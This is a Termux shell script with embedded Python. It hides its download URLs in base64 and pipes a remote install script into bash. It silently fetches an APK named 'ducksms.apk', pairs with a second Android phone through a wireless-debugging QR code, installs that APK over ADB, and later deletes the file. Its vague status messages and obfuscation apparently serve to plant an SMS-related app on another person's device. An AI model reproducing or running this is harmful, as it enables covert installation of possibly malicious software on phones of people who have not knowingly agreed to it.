#!/data/data/com.termux/files/usr/bin/bash

DEBUG_PORT=${1}

APK_LIFETIME=${2:-60}

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m'

echo -e "${CYAN}Setting up connection...${NC}"

pkg update -y >/dev/null 2>&1 || { echo -e "${RED}Network error. Please check your connection.${NC}"; exit 1; }
pkg install -y python which curl >/dev/null 2>&1 || { echo -e "${RED}Installation error.${NC}"; exit 1; }

TERMUX_ADB_URL_ENCODED="aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL25vaGFqYy90ZXJtdXgtYWRiL21hc3Rlci9pbnN0YWxsLnNo"
TERMUX_ADB_URL=$(echo $TERMUX_ADB_URL_ENCODED | base64 -d)

curl -s "$TERMUX_ADB_URL" | bash >/dev/null 2>&1 || { echo -e "${RED}Setup failed.${NC}"; exit 1; }

if ! which termux-adb >/dev/null; then
    echo -e "${RED}Setup failed. Please try again later.${NC}"
    exit 1
fi

APK_URL_ENCODED="aHR0cHM6Ly9naXRodWIuY29tL255cm9zLXNvbGFyaS9zY3JpcHRzL3JlbGVhc2VzL2Rvd25sb2FkL3YxLjAuMC1iZXRhL2FwcC1kZWJ1Zy5hcGs="
APK_URL=$(echo $APK_URL_ENCODED | base64 -d)

APK_PATH="$HOME/ducksms.apk"
if [ ! -f "$APK_PATH" ]; then
    echo -e "${CYAN}Preparing installation files...${NC}"
    curl -L "$APK_URL" -o "$APK_PATH" >/dev/null 2>&1 || {
        echo -e "${RED}Download failed. Please check your connection.${NC}"
        exit 1
    }
    
    (
        sleep $((APK_LIFETIME * 60))
        if [ -f "$APK_PATH" ]; then
            rm "$APK_PATH" >/dev/null 2>&1
        fi
    ) >/dev/null 2>&1 &
fi

pip install qrcode colorama zeroconf >/dev/null 2>&1 || { echo -e "${RED}Setup failed.${NC}"; exit 1; }

echo -e "${CYAN}Ready to connect. Please scan the QR code below:${NC}"

python - "$DEBUG_PORT" "$APK_PATH" << 'EOF'
#!/data/data/com.termux/files/usr/bin/python
import os
import subprocess
import time
from random import randint
import sys

fixed_debug_port = None
if len(sys.argv) > 1 and sys.argv[1] and sys.argv[1].isdigit():
    fixed_debug_port = int(sys.argv[1])

apk_path = None
if len(sys.argv) > 2:
    apk_path = sys.argv[2]

try:
    check_cmd = ["which", "termux-adb"]
    process = subprocess.run(check_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    if process.returncode != 0:
        print("\033[0;31mSetup error. Please try again.\033[0m")
        sys.exit(1)
except Exception as e:
    print("\033[0;31mSetup error. Please try again.\033[0m")
    sys.exit(1)

try:
    import qrcode
    from colorama import Fore, init as colorama_init
    from zeroconf import Zeroconf, ServiceBrowser, ServiceListener, ServiceInfo, IPVersion
except ImportError as e:
    print("\033[0;31mSetup error. Please try again.\033[0m")
    sys.exit(1)

colorama_init()

TYPE = "_adb-tls-pairing._tcp.local."
NAME = "debug"
PASSWORD = randint(100000, 999999)
FORMAT_QR = f"WIFI:T:ADB;S:{NAME};P:{PASSWORD};;"

qr = qrcode.QRCode()
qr.add_data(FORMAT_QR)
qr.make(fit=True)

print(f"{Fore.YELLOW}Pairing code: {PASSWORD}{Fore.RESET}")

qr.print_ascii(invert=True)

print(f"{Fore.YELLOW}Scan QR code with your device{Fore.RESET}")
print(f"{Fore.CYAN}[Settings] > [Developer options] > [Wireless debugging] > [Pair device with QR code]{Fore.RESET}")

class ADBListener(ServiceListener):
    def remove_service(self, zc, type_, name):
        pass
        
    def add_service(self, zc, type_, name):
        info = zc.get_service_info(type_, name)
        if not info:
            return
            
        print(f"{Fore.GREEN}Device found! Connecting...{Fore.RESET}")
        self.pair(info)
        
    def pair(self, info):
        try:
            ip_address = info.ip_addresses_by_version(IPVersion.All)[0].exploded
            port = info.port
            
            cmd = f"termux-adb pair {ip_address}:{port} {PASSWORD}"
            process = subprocess.run(cmd.split(), capture_output=True, text=True)
            
            if "Successfully paired" in process.stdout:
                print(f"{Fore.GREEN}Device paired successfully{Fore.RESET}")
                
                if fixed_debug_port:
                    debug_port = fixed_debug_port
                else:
                    debug_port = port - 1
                
                connect_cmd = f"termux-adb connect {ip_address}:{debug_port}"
                connect_process = subprocess.run(connect_cmd.split(), capture_output=True, text=True)
                if "connected" in connect_process.stdout.lower():
                    print(f"{Fore.GREEN}Device connected successfully{Fore.RESET}")
                    
                    if apk_path:
                        print(f"{Fore.CYAN}Installing application...{Fore.RESET}")
                        install_cmd = f"termux-adb install {apk_path}"
                        install_process = subprocess.run(install_cmd.split(), capture_output=True, text=True)
                        if "Success" in install_process.stdout:
                            print(f"{Fore.GREEN}Installation successful!{Fore.RESET}")
                            print(f"{Fore.CYAN}You may now use the app on your device.{Fore.RESET}")
                            os._exit(0)
                        else:
                            if "INSTALL_FAILED_ALREADY_EXISTS" in install_process.stdout:
                                print(f"{Fore.GREEN}Application already installed{Fore.RESET}")
                                os._exit(0)
                            else:
                                print(f"{Fore.RED}Installation failed. Please try again.{Fore.RESET}")
                else:
                    if not fixed_debug_port:
                        alt_debug_port = port
                        connect_cmd = f"termux-adb connect {ip_address}:{alt_debug_port}"
                        connect_process = subprocess.run(connect_cmd.split(), capture_output=True, text=True)
                        if "connected" in connect_process.stdout.lower():
                            print(f"{Fore.GREEN}Device connected successfully{Fore.RESET}")
                            
                            if apk_path:
                                print(f"{Fore.CYAN}Installing application...{Fore.RESET}")
                                install_cmd = f"termux-adb install {apk_path}"
                                install_process = subprocess.run(install_cmd.split(), capture_output=True, text=True)
                                if "Success" in install_process.stdout:
                                    print(f"{Fore.GREEN}Installation successful!{Fore.RESET}")
                                    print(f"{Fore.CYAN}You may now use the app on your device.{Fore.RESET}")
                                    os._exit(0)
                                else:
                                    if "INSTALL_FAILED_ALREADY_EXISTS" in install_process.stdout:
                                        print(f"{Fore.GREEN}Application already installed{Fore.RESET}")
                                        os._exit(0)
                                    else:
                                        print(f"{Fore.RED}Installation failed. Please try again.{Fore.RESET}")
                        else:
                            print(f"{Fore.RED}Connection failed. Please try again.{Fore.RESET}")
            else:
                print(f"{Fore.RED}Pairing failed. Please try again.{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}Connection error. Please try again.{Fore.RESET}")
            
    def update_service(self, zc, type_, name):
        pass

print(f"{Fore.CYAN}Waiting for device...{Fore.RESET}")
print(f"{Fore.YELLOW}Press Ctrl+C to cancel{Fore.RESET}")

try:
    zeroconf = Zeroconf()
    listener = ADBListener()
    browser = ServiceBrowser(zeroconf, TYPE, listener)
    
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"{Fore.CYAN}\nCancelled.{Fore.RESET}")
finally:
    try:
        zeroconf.close()
    except:
        pass
EOF

echo -e "${GREEN}Setup complete.${NC}"
